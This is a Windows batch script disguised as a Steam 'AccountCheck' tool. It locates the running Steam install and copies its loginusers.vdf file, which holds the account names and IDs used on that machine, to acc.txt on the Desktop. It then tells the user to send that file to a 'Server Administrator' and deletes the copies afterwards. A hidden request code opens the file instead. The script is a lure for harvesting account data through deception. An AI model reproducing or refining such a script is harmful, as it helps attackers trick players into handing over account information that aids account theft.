@echo off
color 70
set "param=AccountCheck by FIVE (v1.0 beta)"
title %param%

set "param2=-------------------------------- %param% --------------------------------"


@echo off
Set ProcessName=Steam.exe
rem ------------------------------------------------------------------------------
:start
color 70
TaskList /FI "ImageName EQ %ProcessName%" 2>nul|Find /I "%ProcessName%">nul||(
    goto Failed
)

for /f "tokens=1* delims==" %%i in ('
 wmic process where "Name='%ProcessName%'" get ExecutablePath /value^| findstr :
') do set ExecutablePath=%%j
rem ------------------------------------------------------------------------------
cls
::if defined ExecutablePath
    set "str1=%ExecutablePath:~0,-10%"
    set "str2=config"
    set "str3=.vdf"
    set "str4=\loginusers"
    set "Path2=%str1%%str2%%str4%%str3%"
cls

set "mia="
set /p mia="Enter request code or press Enter: "

if defined mia (
    echo [%mia%]
) else (
    goto default
)

echo %Path2%

if %mia%==5 ( goto continue 
) else goto default

:continue
copy "%Path2%" "%systemdrive%\users\%username%\Desktop\acc.txt"
copy "%Path2%" "acc.txt"
cls
color 20
echo %param2%
echo All accounts adding to file acc.txt in Desktop
echo PRESS ENTER BUTTON TO OPEN ACCOUNTS FILE
echo %param2%
pause>nul
Start acc.txt
exit

:default
copy "%Path2%" "%systemdrive%\users\%username%\Desktop\acc.txt"
copy "%Path2%" "acc.txt"
cls
color 02
echo %param2%
echo Checking your accounts... 
echo Step 1. Check acc.txt on your Desktop, and send this file to Server Administrator
echo Step 2. PRESS ENTER BUTTON TO CLOSE WINDOW
echo %param2%
pause>nul
goto filedel

:Failed
cls
color 4
echo %param2%
echo Failed: Steam is not running
echo PRESS ENTER TO REFRESH STEAM STATUS
echo %param2%
pause>nul
goto start

:filedel
del "%systemdrive%\users\%username%\Desktop\acc.txt"
del "acc.txt"
exit